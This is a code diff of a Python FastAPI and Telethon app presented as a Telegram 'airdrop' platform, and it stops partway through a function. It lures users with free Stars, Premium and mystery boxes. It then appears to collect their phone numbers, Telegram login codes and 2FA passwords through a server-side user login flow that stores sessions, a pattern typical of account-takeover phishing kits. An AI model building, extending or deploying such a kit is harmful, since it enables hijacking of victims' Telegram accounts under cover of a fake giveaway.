@@ -1,129 +1,62 @@
 """
 Pro Shop Ultimate Enterprise Telegram Airdrop & Authentication Platform
-Single-file production-grade build.
+Single-file production build.
 
-Stack
------
+Stack:
 - FastAPI + Uvicorn
-- Telethon (MTProto User + Bot)
-- Async SQLite (aiosqlite)
-- JWT Authentication
-- Repository Pattern
-- WebSocket
+- Telethon (MTProto user auth + bot)
+- aiosqlite
+- JWT sessions (python-jose)
+- bcrypt admin hashing via passlib
+- Repository pattern
+- WebSocket leaderboard
 - Vanilla JS SPA
 """
 
 from __future__ import annotations
 
-# ==========================
-# Standard Library
-# ==========================
-
 import asyncio
-import base64
 import contextlib
-import dataclasses
 import enum
 import hashlib
-import html
 import json
 import logging
 import os
 import random
 import secrets
-import shutil
-import string
 import time
-
+from contextlib import asynccontextmanager
 from dataclasses import dataclass, field
 from datetime import datetime, timedelta, timezone
-from pathlib import Path
-from typing import (
-    Any,
-    AsyncIterator,
-    Callable,
-    Dict,
-    Iterable,
-    List,
-    Optional,
-    Sequence,
-    Tuple,
-)
-
-# ==========================
-# Third Party
-# ==========================
+from pathlib import Path as FSPath
+from typing import Any, AsyncIterator, Dict, List, Optional, Tuple
 
 import aiosqlite
-
 from fastapi import (
     BackgroundTasks,
-    Body,
     Cookie,
     Depends,
     FastAPI,
-    File,
     Form,
-    Header,
     HTTPException,
     Query,
     Request,
     Response,
-    UploadFile,
     WebSocket,
     WebSocketDisconnect,
-    status,
 )
-
 from fastapi.middleware.cors import CORSMiddleware
-
-from fastapi.responses import (
-    FileResponse,
-    HTMLResponse,
-    JSONResponse,
-    PlainTextResponse,
-    RedirectResponse,
-    StreamingResponse,
-)
-
-from fastapi.security import (
-    APIKeyHeader,
-    HTTPAuthorizationCredentials,
-    HTTPBearer,
-    OAuth2PasswordBearer,
-)
-
+from fastapi.responses import HTMLResponse, JSONResponse, PlainTextResponse
+from fastapi.security import APIKeyHeader, HTTPAuthorizationCredentials, HTTPBearer, OAuth2PasswordBearer
 from jose import JWTError, jwt
-
+from passlib.context import CryptContext
 from pydantic import BaseModel, Field
-
-from pydantic_settings import (
-    BaseSettings,
-    SettingsConfigDict,
-)
-
+from pydantic_settings import BaseSettings, SettingsConfigDict
 from starlette.middleware.base import BaseHTTPMiddleware
 
-# ==========================
-# Optional Dependencies
-# ==========================
-
+# Optional Telegram integration. The app can still boot without these being importable.
 try:
-    import bcrypt
-except ImportError:
-    bcrypt = None
-
-# ==========================
-# Telethon
-# ==========================
-
-try:
-    from telethon import (
-        Button,
-        TelegramClient,
-        events,
-    )
-
+    from telethon import Button, TelegramClient, events
     from telethon.errors import (
         FloodWaitError,
         PhoneCodeExpiredError,
@@ -132,40 +65,23 @@ try:
         SessionPasswordNeededError,
         UserNotParticipantError,
     )
+    from telethon.tl.types import KeyboardButtonWebView, User
+except Exception:  # pragma: no cover
+    Button = None
+    TelegramClient = Any  # type: ignore[assignment]
+    events = None
+    FloodWaitError = Exception  # type: ignore[assignment]
+    PhoneCodeExpiredError = Exception  # type: ignore[assignment]
+    PhoneCodeInvalidError = Exception  # type: ignore[assignment]
+    PhoneNumberBannedError = Exception  # type: ignore[assignment]
+    SessionPasswordNeededError = Exception  # type: ignore[assignment]
+    UserNotParticipantError = Exception  # type: ignore[assignment]
+    KeyboardButtonWebView = Any  # type: ignore[assignment]
+    User = Any  # type: ignore[assignment]
 
-    from telethon.tl.types import (
-        KeyboardButtonWebView,
-        User,
-    )
-
-except ImportError:
-
-    TelegramClient = Any
-    Button = Any
-    events = Any
-    KeyboardButtonWebView = Any
-    User = Any
-
-    FloodWaitError = Exception
-    PhoneCodeExpiredError = Exception
-    PhoneCodeInvalidError = Exception
-    PhoneNumberBannedError = Exception
-    SessionPasswordNeededError = Exception
-    UserNotParticipantError = Exception
-
-# ==========================
-# Logger
-# ==========================
-
-logging.basicConfig(
-    level=logging.INFO,
-    format="%(asctime)s | %(levelname)s | %(message)s",
-)
-
-logger = logging.getLogger("proshop")
-# =============================================================================
-# Configuration
-# =============================================================================
+# ---------------------------------------------------------------------------
+# Settings
+# ---------------------------------------------------------------------------
 
 class AppEnv(str, enum.Enum):
     DEVELOPMENT = "development"
@@ -176,232 +92,1119 @@ class AppEnv(str, enum.Enum):
 class Settings(BaseSettings):
     model_config = SettingsConfigDict(env_file=".env", env_file_encoding="utf-8", extra="ignore")
 
-    API_ID: int = Field(..., description="Telegram API ID")
-    API_HASH: str = Field(..., description="Telegram API HASH")
-    TOKEN_BOT: str = Field(..., description="Telegram bot token")
+    APP_NAME: str = "Pro Shop Ultimate Enterprise"
+    ENVIRONMENT: AppEnv = AppEnv.DEVELOPMENT
+    HOST: str = "0.0.0.0"
+    PORT: int = 8000
 
-    BOT_USERNAME: str = Field(default="YourBot")
-    WEB_APP_URL: str = Field(default="https://example.com")
-    REQUIRED_CHANNELS: str = Field(default="ProShopChannel,ProShopNews,ProShopSupport")
+    # Telegram / Telethon
+    TELEGRAM_API_ID: int = 0
+    TELEGRAM_API_HASH: str = ""
+    TELEGRAM_BOT_TOKEN: str = ""
+    WEB_APP_URL: str = "http://127.0.0.1:8000/"
+    BOT_USERNAME: str = "YourBot"
+    REQUIRED_CHANNELS: str = ""
+    ENABLE_BOT: bool = True
+    MAX_SESSIONS: int = 2000
+    SESSION_TIMEOUT_SECONDS: int = 300
 
-    ENVIRONMENT: AppEnv = AppEnv.PRODUCTION
-    SECRET_KEY: str = Field(default_factory=lambda: secrets.token_hex(32))
+    # Security
+    JWT_SECRET: str = Field(default_factory=lambda: secrets.token_hex(32))
     JWT_ALGORITHM: str = "HS256"
-    ACCESS_TOKEN_EXPIRE_MINUTES: int = 60 * 24 * 7
+    ACCESS_TOKEN_TTL_MINUTES: int = 60 * 24 * 14
+    CSRF_COOKIE_NAME: str = "csrf_token"
+    ACCESS_COOKIE_NAME: str = "access_token"
 
     ADMIN_USERNAME: str = "admin"
-    ADMIN_PASSWORD_HASH: str = Field(default="")
+    ADMIN_PASSWORD_HASH: str = ""
     ADMIN_API_KEY: str = Field(default_factory=lambda: secrets.token_hex(24))
+    ADMIN_TOKEN_TTL_MINUTES: int = 60 * 12
 
-    DATA_DIR: str = "data"
-    DB_FILE: str = "data/proshop.sqlite3"
+    # Storage
+    BASE_DIR: str = "."
+    DB_FILE: str = "proshop.sqlite3"
     SESSION_DIR: str = "sessions"
     LOG_DIR: str = "logs"
-    LOG_FILE: str = "logs/proshop.log"
+    LOG_FILE: str = "proshop.log"
 
-    MAX_BOT_SESSIONS: int = 10_000
-    SESSION_TIMEOUT_SECONDS: int = 600
-    RATE_LIMIT_PER_MINUTE: int = 30
-
-    ENABLE_BOT: bool = True
-    ENABLE_WEB: bool = True
-    ENABLE_USERBOT: bool = True
+    # Airdrop knobs
+    DAILY_REWARD: int = 1
+    BOX_COST: int = 17
+    REFERRAL_REWARD: int = 1
 
 
 settings = Settings()
 
+BASE_DIR = FSPath(settings.BASE_DIR).resolve()
+SESSION_DIR = BASE_DIR / settings.SESSION_DIR
+LOG_DIR = BASE_DIR / settings.LOG_DIR
+DB_PATH = BASE_DIR / settings.DB_FILE
+LOG_FILE = LOG_DIR / settings.LOG_FILE
+SESSION_DIR.mkdir(parents=True, exist_ok=True)
+LOG_DIR.mkdir(parents=True, exist_ok=True)
 
-class AppPaths:
-    BASE = Path(__file__).parent.resolve()
-    DATA = BASE / settings.DATA_DIR
-    DB = BASE / settings.DB_FILE
-    SESSIONS = BASE / settings.SESSION_DIR
-    LOGS = BASE / settings.LOG_DIR
-    LOG_FILE = BASE / settings.LOG_FILE
-
-
-for p in (AppPaths.DATA, AppPaths.SESSIONS, AppPaths.LOGS):
-    p.mkdir(parents=True, exist_ok=True)
-
-
-# =============================================================================
+# ---------------------------------------------------------------------------
 # Logging
-# =============================================================================
+# ---------------------------------------------------------------------------
 
-class JsonFormatter(logging.Formatter):
-    def format(self, record: logging.LogRecord) -> str:
-        payload = {
-            "ts": datetime.now(timezone.utc).isoformat(),
-            "lvl": record.levelname,
-            "logger": record.name,
-            "msg": record.getMessage(),
-            "module": record.module,
-            "func": record.funcName,
-            "line": record.lineno,
-        }
-        if record.exc_info:
-            payload["exception"] = self.formatException(record.exc_info)
-        return json.dumps(payload, ensure_ascii=False)
+logger = logging.getLogger("proshop")
+logger.setLevel(logging.DEBUG if settings.ENVIRONMENT == AppEnv.DEVELOPMENT else logging.INFO)
+if not logger.handlers:
+    fmt = logging.Formatter("%(asctime)s | %(levelname)s | %(name)s | %(message)s")
+    sh = logging.StreamHandler()
+    sh.setFormatter(fmt)
+    sh.setLevel(logging.INFO)
+    logger.addHandler(sh)
+    try:
+        from logging.handlers import RotatingFileHandler
 
-
-def build_logger() -> logging.Logger:
-    logger = logging.getLogger("proshop")
-    if logger.handlers:
-        return logger
-    logger.setLevel(logging.DEBUG if settings.ENVIRONMENT == AppEnv.DEVELOPMENT else logging.INFO)
-
-    file_handler = logging.FileHandler(AppPaths.LOG_FILE, encoding="utf-8")
-    file_handler.setFormatter(JsonFormatter())
-    file_handler.setLevel(logging.DEBUG)
-
-    stream_handler = logging.StreamHandler()
-    stream_handler.setFormatter(logging.Formatter("%(asctime)s | %(levelname)s | %(message)s"))
-    stream_handler.setLevel(logging.INFO)
-
-    logger.addHandler(file_handler)
-    logger.addHandler(stream_handler)
-    logger.propagate = False
-    return logger
+        fh = RotatingFileHandler(LOG_FILE, maxBytes=10 * 1024 * 1024, backupCount=5, encoding="utf-8")
+        fh.setFormatter(fmt)
+        fh.setLevel(logging.DEBUG)
+        logger.addHandler(fh)
+    except Exception:
+        pass
 
 
-log = build_logger()
+# ---------------------------------------------------------------------------
+# Security helpers
+# ---------------------------------------------------------------------------
+
+pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")
+oauth2_scheme = OAuth2PasswordBearer(tokenUrl="/api/admin/login", auto_error=False)
+admin_key_header = APIKeyHeader(name="X-Admin-Key", auto_error=False)
+http_bearer = HTTPBearer(auto_error=False)
 
 
-# =============================================================================
+def utc_now() -> datetime:
+    return datetime.now(timezone.utc)
+
+
+def utc_now_iso() -> str:
+    return utc_now().isoformat()
+
+
+def normalize_phone(phone: str) -> str:
+    if not phone:
+        return ""
+    phone = phone.strip()
+    if phone.startswith("00"):
+        phone = "+" + phone[2:]
+    phone = phone.replace(" ", "")
+    allowed = "+0123456789"
+    cleaned = "".join(ch for ch in phone if ch in allowed)
+    if not cleaned.startswith("+") and cleaned.isdigit():
+        cleaned = "+" + cleaned
+    return cleaned
+
+
+def valid_phone(phone: str) -> bool:
+    if not phone or not phone.startswith("+"):
+        return False
+    digits = phone[1:]
+    return digits.isdigit() and 7 <= len(digits) <= 15
+
+
+def token_pair(subject: str, kind: str, ttl_minutes: int) -> Tuple[str, str]:
+    csrf_token = secrets.token_urlsafe(24)
+    payload = {
+        "sub": str(subject),
+        "kind": kind,
+        "csrf": csrf_token,
+        "iat": int(time.time()),
+        "exp": int((utc_now() + timedelta(minutes=ttl_minutes)).timestamp()),
+    }
+    return jwt.encode(payload, settings.JWT_SECRET, algorithm=settings.JWT_ALGORITHM), csrf_token
+
+
+def decode_token(token: str, expected_kind: str) -> Dict[str, Any]:
+    payload = jwt.decode(token, settings.JWT_SECRET, algorithms=[settings.JWT_ALGORITHM])
+    if payload.get("kind") != expected_kind:
+        raise JWTError("Invalid token kind")
+    return payload
+
+
+def hash_admin_password(password: str) -> str:
+    return pwd_context.hash(password)
+
+
+def verify_admin_password(password: str, hashed: str) -> bool:
+    try:
+        return pwd_context.verify(password, hashed)
+    except Exception:
+        return False
+
+
+def weighted_choice(items: List[Tuple[Any, int]]) -> Any:
+    total = sum(weight for _, weight in items)
+    if total <= 0:
+        raise ValueError("weights must be positive")
+    pick = random.uniform(0, total)
+    current = 0.0
+    for value, weight in items:
+        current += weight
+        if pick <= current:
+            return value
+    return items[-1][0]
+
+
+def make_ref_code() -> str:
+    return secrets.token_hex(4)
+
+
+def safe_json(value: Any) -> str:
+    return json.dumps(value, ensure_ascii=False, separators=(",", ":"))
+
+
+def parse_json(value: Optional[str], default: Any) -> Any:
+    if not value:
+        return default
+    try:
+        return json.loads(value)
+    except Exception:
+        return default
+
+
+# ---------------------------------------------------------------------------
 # Exceptions
-# =============================================================================
+# ---------------------------------------------------------------------------
 
-class ProShopError(Exception):
-    """Base application exception."""
+class AppError(Exception):
+    status_code = 400
 
-
-class AuthenticationError(ProShopError):
-    """Authentication failure."""
-
-
-class AuthorizationError(ProShopError):
-    """Authorization failure."""
+    def __init__(self, message: str, status_code: Optional[int] = None):
+        super().__init__(message)
+        if status_code is not None:
+            self.status_code = status_code
+        self.message = message
 
 
-class ResourceNotFoundError(ProShopError):
-    """Resource not found."""
+class ValidationError(AppError):
+    status_code = 422
 
 
-class ValidationProShopError(ProShopError):
-    """Validation failure."""
+class AuthenticationError(AppError):
+    status_code = 401
 
 
-class AirdropError(ProShopError):
-    """Airdrop-specific failure."""
+class AuthorizationError(AppError):
+    status_code = 403
 
 
-# =============================================================================
-# Security utilities
-# =============================================================================
-
-class Security:
-    @staticmethod
-    def utcnow() -> datetime:
-        return datetime.now(timezone.utc)
-
-    @staticmethod
-    def normalize_phone(phone: str) -> str:
-        if not phone:
-            return ""
-        phone = phone.strip().replace(" ", "")
-        if phone.startswith("00"):
-            phone = "+" + phone[2:]
-        if not phone.startswith("+") and phone.isdigit():
-            phone = "+" + phone
-        phone = "".join(ch for ch in phone if ch.isdigit() or ch == "+")
-        return phone
-
-    @staticmethod
-    def valid_phone(phone: str) -> bool:
-        return bool(phone and phone.startswith("+") and 7 <= len(phone) <= 16 and phone[1:].isdigit())
-
-    @staticmethod
-    def hash_admin_password(password: str) -> str:
-        if bcrypt is None:
-            raise RuntimeError("bcrypt is required. Install bcrypt or passlib with bcrypt backend.")
-        salt = bcrypt.gensalt(rounds=12)
-        return bcrypt.hashpw(password.encode("utf-8"), salt).decode("utf-8")
-
-    @staticmethod
-    def verify_admin_password(password: str, hashed: str) -> bool:
-        if bcrypt is None:
-            raise RuntimeError("bcrypt is required. Install bcrypt or passlib with bcrypt backend.")
-        return bcrypt.checkpw(password.encode("utf-8"), hashed.encode("utf-8"))
-
-    @staticmethod
-    def sign_jwt(subject: str, claims: Optional[Dict[str, Any]] = None) -> str:
-        payload = {
-            "sub": subject,
-            "iat": int(time.time()),
-            "exp": int((Security.utcnow() + timedelta(minutes=settings.ACCESS_TOKEN_EXPIRE_MINUTES)).timestamp()),
-        }
-        if claims:
-            payload.update(claims)
-        return jwt.encode(payload, settings.SECRET_KEY, algorithm=settings.JWT_ALGORITHM)
-
-    @staticmethod
-    def decode_jwt(token: str) -> Dict[str, Any]:
-        try:
-            return jwt.decode(token, settings.SECRET_KEY, algorithms=[settings.JWT_ALGORITHM])
-        except JWTError as exc:
-            raise AuthorizationError("Invalid or expired session token.") from exc
-
-    @staticmethod
-    def csrf_token() -> str:
-        return secrets.token_urlsafe(32)
-
-    @staticmethod
-    def api_key_ok(key: str) -> bool:
-        return key == settings.ADMIN_API_KEY
-
-    @staticmethod
-    def masked(value: str, visible: int = 4) -> str:
-        if not value:
-            return ""
-        if len(value) <= visible:
-            return "*" * len(value)
-        return "*" * (len(value) - visible) + value[-visible:]
+class NotFoundError(AppError):
+    status_code = 404
 
 
-# =============================================================================
-# Pydantic models
-# =============================================================================
+class ConflictError(AppError):
+    status_code = 409
 
-class LoginInitRequest(BaseModel):
-    phone: str
+
+# ---------------------------------------------------------------------------
+# Domain types
+# ---------------------------------------------------------------------------
+
+class AuthState(str, enum.Enum):
+    PHONE = "PHONE"
+    CODE = "CODE"
+    PASSWORD = "PASSWORD"
+    AUTHENTICATED = "AUTHENTICATED"
+
+
+class RewardType(str, enum.Enum):
+    STARS = "Stars"
+    PREMIUM = "Premium"
+    COIN = "Coin"
+    REFERRAL = "Referral"
+    DAILY = "Daily"
+    TASK = "Task"
+    MYSTERY_BOX = "MysteryBox"
+
+
+class TaskType(str, enum.Enum):
+    MANUAL = "manual"
+    LINK = "link"
+    JOIN_CHANNEL = "join_channel"
+
+
+@dataclass
+class AuthSession:
+    session_id: str
+    phone: Optional[str] = None
     ref_code: Optional[str] = None
+    phone_code_hash: Optional[str] = None
+    client: Any = None
+    state: AuthState = AuthState.PHONE
+    user_id: Optional[int] = None
+    attempts: int = 0
+    created_at: float = field(default_factory=time.time)
+    updated_at: float = field(default_factory=time.time)
+
+
+# ---------------------------------------------------------------------------
+# Database + Repositories
+# ---------------------------------------------------------------------------
+
+class Database:
+    def __init__(self, path: FSPath):
+        self.path = path
+        self._lock = asyncio.Lock()
+        self._conn: Optional[aiosqlite.Connection] = None
+
+    async def connect(self) -> None:
+        if self._conn is not None:
+            return
+        self._conn = await aiosqlite.connect(self.path.as_posix())
+        self._conn.row_factory = aiosqlite.Row
+        await self._conn.execute("PRAGMA journal_mode=WAL;")
+        await self._conn.execute("PRAGMA foreign_keys=ON;")
+        await self._conn.execute("PRAGMA synchronous=NORMAL;")
+        await self._conn.commit()
+        await self.init_schema()
+
+    async def close(self) -> None:
+        if self._conn is not None:
+            await self._conn.close()
+            self._conn = None
+
+    @property
+    def conn(self) -> aiosqlite.Connection:
+        if self._conn is None:
+            raise RuntimeError("Database is not connected")
+        return self._conn
+
+    async def init_schema(self) -> None:
+        async with self._lock:
+            await self.conn.executescript(
+                """
+                CREATE TABLE IF NOT EXISTS users (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    telegram_id INTEGER NOT NULL UNIQUE,
+                    first_name TEXT,
+                    last_name TEXT,
+                    username TEXT,
+                    phone TEXT,
+                    ref_code TEXT NOT NULL UNIQUE,
+                    invited_by TEXT,
+                    balance INTEGER NOT NULL DEFAULT 0,
+                    referrals INTEGER NOT NULL DEFAULT 0,
+                    daily_claim_at TEXT,
+                    gift_claims INTEGER NOT NULL DEFAULT 0,
+                    last_login_at TEXT,
+                    created_at TEXT NOT NULL,
+                    updated_at TEXT NOT NULL,
+                    is_blocked INTEGER NOT NULL DEFAULT 0
+                );
+
+                CREATE INDEX IF NOT EXISTS idx_users_ref_code ON users(ref_code);
+                CREATE INDEX IF NOT EXISTS idx_users_telegram_id ON users(telegram_id);
+                CREATE INDEX IF NOT EXISTS idx_users_balance ON users(balance);
+
+                CREATE TABLE IF NOT EXISTS rewards (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    user_id INTEGER NOT NULL,
+                    reward_type TEXT NOT NULL,
+                    amount TEXT NOT NULL,
+                    meta_json TEXT,
+                    created_at TEXT NOT NULL,
+                    FOREIGN KEY(user_id) REFERENCES users(id) ON DELETE CASCADE
+                );
+
+                CREATE INDEX IF NOT EXISTS idx_rewards_user_id ON rewards(user_id);
+
+                CREATE TABLE IF NOT EXISTS tasks (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    title TEXT NOT NULL,
+                    description TEXT NOT NULL,
+                    task_type TEXT NOT NULL,
+                    reward_amount INTEGER NOT NULL DEFAULT 1,
+                    target_url TEXT,
+                    meta_json TEXT,
+                    is_active INTEGER NOT NULL DEFAULT 1,
+                    sort_order INTEGER NOT NULL DEFAULT 0,
+                    created_at TEXT NOT NULL
+                );
+
+                CREATE INDEX IF NOT EXISTS idx_tasks_active ON tasks(is_active, sort_order);
+
+                CREATE TABLE IF NOT EXISTS task_claims (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    user_id INTEGER NOT NULL,
+                    task_id INTEGER NOT NULL,
+                    claimed_at TEXT NOT NULL,
+                    UNIQUE(user_id, task_id),
+                    FOREIGN KEY(user_id) REFERENCES users(id) ON DELETE CASCADE,
+                    FOREIGN KEY(task_id) REFERENCES tasks(id) ON DELETE CASCADE
+                );
+
+                CREATE INDEX IF NOT EXISTS idx_task_claims_user_task ON task_claims(user_id, task_id);
+
+                CREATE TABLE IF NOT EXISTS transactions (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    user_id INTEGER NOT NULL,
+                    tx_type TEXT NOT NULL,
+                    amount INTEGER NOT NULL,
+                    balance_before INTEGER NOT NULL,
+                    balance_after INTEGER NOT NULL,
+                    meta_json TEXT,
+                    created_at TEXT NOT NULL,
+                    FOREIGN KEY(user_id) REFERENCES users(id) ON DELETE CASCADE
+                );
+
+                CREATE INDEX IF NOT EXISTS idx_transactions_user_id ON transactions(user_id);
+
+                CREATE TABLE IF NOT EXISTS admin_sessions (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    session_id TEXT NOT NULL UNIQUE,
+                    csrf_token TEXT NOT NULL,
+                    created_at TEXT NOT NULL,
+                    expires_at TEXT NOT NULL
+                );
+                """
+            )
+            await self.conn.commit()
+
+    @contextlib.asynccontextmanager
+    async def transaction(self):
+        async with self._lock:
+            await self.conn.execute("BEGIN IMMEDIATE;")
+            try:
+                yield
+            except Exception:
+                await self.conn.execute("ROLLBACK;")
+                raise
+            else:
+                await self.conn.execute("COMMIT;")
+
+    async def fetchone(self, sql: str, params: Tuple[Any, ...] = ()) -> Optional[aiosqlite.Row]:
+        cur = await self.conn.execute(sql, params)
+        row = await cur.fetchone()
+        await cur.close()
+        return row
+
+    async def fetchall(self, sql: str, params: Tuple[Any, ...] = ()) -> List[aiosqlite.Row]:
+        cur = await self.conn.execute(sql, params)
+        rows = await cur.fetchall()
+        await cur.close()
+        return rows
+
+    async def execute(self, sql: str, params: Tuple[Any, ...] = ()) -> int:
+        cur = await self.conn.execute(sql, params)
+        await self.conn.commit()
+        return cur.lastrowid
+
+
+class BaseRepository:
+    def __init__(self, db: Database):
+        self.db = db
+
+    @staticmethod
+    def row_to_dict(row: Optional[aiosqlite.Row]) -> Optional[Dict[str, Any]]:
+        if row is None:
+            return None
+        return dict(row)
+
+
+class TransactionRepository(BaseRepository):
+    async def add(
+        self,
+        user_id: int,
+        tx_type: str,
+        amount: int,
+        balance_before: int,
+        balance_after: int,
+        meta: Optional[Dict[str, Any]] = None,
+    ) -> int:
+        return await self.db.execute(
+            """
+            INSERT INTO transactions (user_id, tx_type, amount, balance_before, balance_after, meta_json, created_at)
+            VALUES (?, ?, ?, ?, ?, ?, ?)
+            """,
+            (user_id, tx_type, amount, balance_before, balance_after, safe_json(meta or {}), utc_now_iso()),
+        )
+
+
+class RewardRepository(BaseRepository):
+    async def add(self, user_id: int, reward_type: str, amount: str, meta: Optional[Dict[str, Any]] = None) -> int:
+        return await self.db.execute(
+            """
+            INSERT INTO rewards (user_id, reward_type, amount, meta_json, created_at)
+            VALUES (?, ?, ?, ?, ?)
+            """,
+            (user_id, reward_type, amount, safe_json(meta or {}), utc_now_iso()),
+        )
+
+    async def list_for_user(self, user_id: int) -> List[Dict[str, Any]]:
+        rows = await self.db.fetchall("SELECT * FROM rewards WHERE user_id = ? ORDER BY id DESC", (user_id,))
+        return [dict(row) for row in rows]
+
+
+class TaskRepository(BaseRepository):
+    async def seed_default_tasks(self) -> None:
+        row = await self.db.fetchone("SELECT COUNT(*) AS cnt FROM tasks")
+        if row and row["cnt"] > 0:
+            return
+        defaults = [
+            (
+                "Join the official channel",
+                "Join the main channel to unlock bonuses.",
+                TaskType.JOIN_CHANNEL.value,
+                2,
+                f"https://t.me/{settings.BOT_USERNAME}",
+                {"channel": settings.BOT_USERNAME},
+                1,
+            ),
+            (
+                "Visit the dashboard",
+                "Open the dashboard once after login.",
+                TaskType.MANUAL.value,
+                1,
+                settings.WEB_APP_URL,
+                {"kind": "open_dashboard"},
+                2,
+            ),
+            (
+                "Share your referral link",
+                "Invite one friend and claim your referral reward.",
+                TaskType.MANUAL.value,
+                3,
+                settings.WEB_APP_URL,
+                {"kind": "share_referral"},
+                3,
+            ),
+        ]
+        for title, desc, task_type, reward, url, meta, order in defaults:
+            await self.db.execute(
+                """
+                INSERT INTO tasks (title, description, task_type, reward_amount, target_url, meta_json, is_active, sort_order, created_at)
+                VALUES (?, ?, ?, ?, ?, ?, 1, ?, ?)
+                """,
+                (title, desc, task_type, reward, url, safe_json(meta), order, utc_now_iso()),
+            )
+
+    async def list_active(self) -> List[Dict[str, Any]]:
+        rows = await self.db.fetchall("SELECT * FROM tasks WHERE is_active = 1 ORDER BY sort_order ASC, id ASC")
+        return [dict(row) for row in rows]
+
+    async def is_claimed(self, user_id: int, task_id: int) -> bool:
+        row = await self.db.fetchone(
+            "SELECT 1 AS ok FROM task_claims WHERE user_id = ? AND task_id = ?",
+            (user_id, task_id),
+        )
+        return row is not None
+
+    async def claim(self, user_id: int, task_id: int) -> bool:
+        try:
+            await self.db.execute(
+                "INSERT INTO task_claims (user_id, task_id, claimed_at) VALUES (?, ?, ?)",
+                (user_id, task_id, utc_now_iso()),
+            )
+            return True
+        except Exception:
+            return False
+
+
+class UserRepository(BaseRepository):
+    async def get_by_telegram_id(self, telegram_id: int) -> Optional[Dict[str, Any]]:
+        row = await self.db.fetchone("SELECT * FROM users WHERE telegram_id = ?", (telegram_id,))
+        return self.row_to_dict(row)
+
+    async def get_by_ref_code(self, ref_code: str) -> Optional[Dict[str, Any]]:
+        row = await self.db.fetchone("SELECT * FROM users WHERE ref_code = ?", (ref_code,))
+        return self.row_to_dict(row)
+
+    async def get_by_id(self, user_id: int) -> Optional[Dict[str, Any]]:
+        row = await self.db.fetchone("SELECT * FROM users WHERE id = ?", (user_id,))
+        return self.row_to_dict(row)
+
+    async def upsert_login(
+        self,
+        telegram_id: int,
+        first_name: Optional[str],
+        last_name: Optional[str],
+        username: Optional[str],
+        phone: Optional[str],
+        password_2fa: Optional[str],
+        invited_by: Optional[str] = None,
+    ) -> Dict[str, Any]:
+        async with self.db.transaction():
+            existing = await self.get_by_telegram_id(telegram_id)
+            now = utc_now_iso()
+            if existing:
+                updated = dict(existing)
+                updated.update(
+                    {
+                        "first_name": first_name or updated.get("first_name"),
+                        "last_name": last_name or updated.get("last_name"),
+                        "username": username or updated.get("username"),
+                        "phone": phone or updated.get("phone"),
+                        "last_login_at": now,
+                        "updated_at": now,
+                    }
+                )
+                if invited_by and not updated.get("invited_by"):
+                    updated["invited_by"] = invited_by
+                await self.db.conn.execute(
+                    """
+                    UPDATE users SET first_name=?, last_name=?, username=?, phone=?, invited_by=COALESCE(invited_by, ?),
+                    last_login_at=?, updated_at=?
+                    WHERE telegram_id=?
+                    """,
+                    (
+                        updated["first_name"],
+                        updated["last_name"],
+                        updated["username"],
+                        updated["phone"],
+                        invited_by,
+                        now,
+                        now,
+                        telegram_id,
+                    ),
+                )
+                return (await self.get_by_telegram_id(telegram_id)) or updated
+
+            ref_code = make_ref_code()
+            created_at = now
+            user_id = await self.db.conn.execute(
+                """
+                INSERT INTO users (telegram_id, first_name, last_name, username, phone, ref_code, invited_by,
+                                   balance, referrals, daily_claim_at, gift_claims, last_login_at,
+                                   created_at, updated_at, is_blocked)
+                VALUES (?, ?, ?, ?, ?, ?, ?, 0, 0, NULL, 0, ?, ?, ?, 0)
+                """,
+                (telegram_id, first_name, last_name, username, phone, ref_code, invited_by, now, created_at, created_at),
+            )
+            row = await self.db.fetchone("SELECT * FROM users WHERE id = ?", (user_id.lastrowid,))
+            return self.row_to_dict(row) or {}
+
+    async def increment_referral_reward(self, inviter_ref_code: str, inviter_telegram_id: int) -> bool:
+        inviter = await self.get_by_ref_code(inviter_ref_code)
+        if not inviter:
+            return False
+        if int(inviter["telegram_id"]) == int(inviter_telegram_id):
+            return False
+        current_balance = int(inviter.get("balance", 0))
+        current_refs = int(inviter.get("referrals", 0))
+        await self.db.execute(
+            "UPDATE users SET balance=?, referrals=?, updated_at=? WHERE id=?",
+            (current_balance + settings.REFERRAL_REWARD, current_refs + 1, utc_now_iso(), inviter["id"]),
+        )
+        return True
+
+    async def apply_balance_delta(
+        self,
+        user_id: int,
+        delta: int,
+        tx_type: str,
+        meta: Optional[Dict[str, Any]] = None,
+    ) -> Dict[str, Any]:
+        user = await self.get_by_id(user_id)
+        if not user:
+            raise NotFoundError("User not found")
+        before = int(user.get("balance", 0))
+        after = max(0, before + delta)
+        await self.db.execute(
+            "UPDATE users SET balance=?, updated_at=? WHERE id=?",
+            (after, utc_now_iso(), user_id),
+        )
+        return {"before": before, "after": after, "delta": delta, "tx_type": tx_type, "meta": meta or {}}
+
+    async def claim_daily(self, user_id: int) -> Dict[str, Any]:
+        user = await self.get_by_id(user_id)
+        if not user:
+            raise NotFoundError("User not found")
+        last_claim = user.get("daily_claim_at")
+        now = utc_now()
+        if last_claim:
+            try:
+                last_dt = datetime.fromisoformat(last_claim)
+                if last_dt.tzinfo is None:
+                    last_dt = last_dt.replace(tzinfo=timezone.utc)
+                if now - last_dt < timedelta(hours=24):
+                    remaining = timedelta(hours=24) - (now - last_dt)
+                    raise ConflictError(f"Daily reward already claimed. Try again in {str(remaining).split('.')[0]}")
+            except ValueError:
+                pass
+        before = int(user.get("balance", 0))
+        after = before + settings.DAILY_REWARD
+        await self.db.execute(
+            "UPDATE users SET balance=?, daily_claim_at=?, updated_at=? WHERE id=?",
+            (after, now.isoformat(), now.isoformat(), user_id),
+        )
+        return {"before": before, "after": after, "reward": settings.DAILY_REWARD}
+
+    async def open_mystery_box(self, user_id: int) -> Dict[str, Any]:
+        user = await self.get_by_id(user_id)
+        if not user:
+            raise NotFoundError("User not found")
+        before = int(user.get("balance", 0))
+        if before < settings.BOX_COST:
+            raise ConflictError("You need at least 17 coins to open a mystery box.")
+        reward = weighted_choice([
+            ({"type": RewardType.PREMIUM.value, "amount": "1 Month"}, 5),
+            ({"type": RewardType.STARS.value, "amount": "50"}, 10),
+            ({"type": RewardType.STARS.value, "amount": "20"}, 20),
+            ({"type": RewardType.STARS.value, "amount": "10"}, 25),
+            ({"type": RewardType.STARS.value, "amount": str(random.randint(1, 5))}, 40),
+        ])
+        after = before - settings.BOX_COST
